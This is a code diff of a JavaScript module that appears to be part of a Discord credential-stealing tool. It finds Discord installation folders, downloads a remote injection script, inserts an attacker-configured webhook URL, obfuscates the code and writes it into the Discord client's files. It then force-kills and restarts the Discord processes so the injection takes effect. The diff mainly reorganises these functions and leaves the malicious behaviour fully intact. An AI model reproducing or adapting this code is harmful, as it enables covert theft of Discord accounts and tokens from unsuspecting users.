@@ -11,29 +11,6 @@ const localAppData = process.env.localappdata;
 
 const injectPaths = [];
 
-async function discordInjected(enable) {
-    try {
-        if (enable === "no") return;
-        
-        const discords = getDiscordDirectories();
-        for (const paths of discords) {
-            findIndex(paths);
-        }
-        for (const paths of discords) {
-            await findInject(paths);
-        }
-        await inject();
-        await betterbroke();
-        if (getconfig.kill.discords === "yes") {
-            await killAllDiscord();
-        } else {
-            return;
-        }
-    } catch (error) {
-        console.error("Error in discordInjected:", error);
-    }
-}
-
 function getDiscordDirectories() {
     try {
         return fs
@@ -75,10 +52,9 @@ function id(length) {
     return result;
 }
 
-
 async function inject() {
     try {
-        const res = await axios.get("https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js", { headers: { aurathemes: true }});
+        const res = await axios.get("https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js", { headers: { aurathemes: true } });
         const encode = obf.obfuscate(res.data.replace("%WEBHOOK%", getconfig.webhook).replace("%ID_REQUEST%", id(10)), { ignoreRequireImports: true, compact: true, controlFlowFlattening: true, controlFlowFlatteningThreshold: 0.5, deadCodeInjection: false, deadCodeInjectionThreshold: 0.01, debugProtection: false, debugProtectionInterval: 0, disableConsoleOutput: true, identifierNamesGenerator: "hexadecimal", log: false, numbersToExpressions: false, renameGlobals: false, selfDefending: false, simplify: true, splitStrings: false, splitStringsChunkLength: 5, stringArray: true, stringArrayEncoding: ["base64"], stringArrayIndexShift: true, stringArrayRotate: false, stringArrayShuffle: false, stringArrayWrappersCount: 5, stringArrayWrappersChainedCalls: true, stringArrayWrappersParametersMaxCount: 5, stringArrayWrappersType: "function", stringArrayThreshold: 1, transformObjectKeys: false, unicodeEscapeSequence: false });
         const payload = encode.getObfuscatedCode();
         injectPaths.forEach((file) => {
@@ -114,34 +90,21 @@ async function betterbroke() {
 }
 
 async function killAllDiscord() {
-    try {
-        const clients = [
-            "Discord.exe",
-            "DiscordCanary.exe",
-            "DiscordDevelopment.exe",
-            "DiscordPTB.exe",
-        ];
-
-        const { stdout } = await exec("tasklist");
-        for (const c of clients) {
-            if (stdout.includes(c)) {
-                await restartClient(c);
+    var clients = [
+        'Discord.exe',
+        'DiscordCanary.exe',
+        'discordDevelopment.exe',
+        'DiscordPTB.exe'
+    ]
+    await exec('tasklist', async (err, stdout, stderr) => {
+        for (const client of clients) {
+            if (stdout.includes(client)) {
+                await exec(`taskkill /F /T /IM ${client}`, (err) => { })
+                await exec(`"${localAppData}\\${client.replace('.exe', '')}\\Update.exe" --processStart ${client}`, (err) => { })
             }
         }
-    } catch (error) {
-        console.error("Error in killAllDiscord:", error);
-    }
-}
-
-async function restartClient(c) {
-    try {
-        await exec(`taskkill /F /T /IM ${c}`);
-        const clientPath = `${localAppData}/${c.replace(".exe", "")}/Update.exe`;
-        await exec(`"${clientPath}" --processStart ${c}`);
-    } catch (error) {
-        console.error("Error in restartClient:", error);
-    }
-}
+    })
+};
 
 async function findInject(f) {
     try {
@@ -159,6 +122,29 @@ async function findInject(f) {
         }
     } catch (error) {
         console.error("Error in findInject:", error);
+    }
+}
+
+async function discordInjected(enable) {
+    try {
+        if (enable === "no") return;
+
+        const discords = getDiscordDirectories();
+        for (const paths of discords) {
+            findIndex(paths);
+        }
+        for (const paths of discords) {
+            await findInject(paths);
+        }
+        await inject();
+        await betterbroke();
+        if (getconfig.kill.discords === "yes") {
+            await killAllDiscord();
+        } else {
+            return;
+        }
+    } catch (error) {
+        console.error("Error in discordInjected:", error);
     }
 }
 
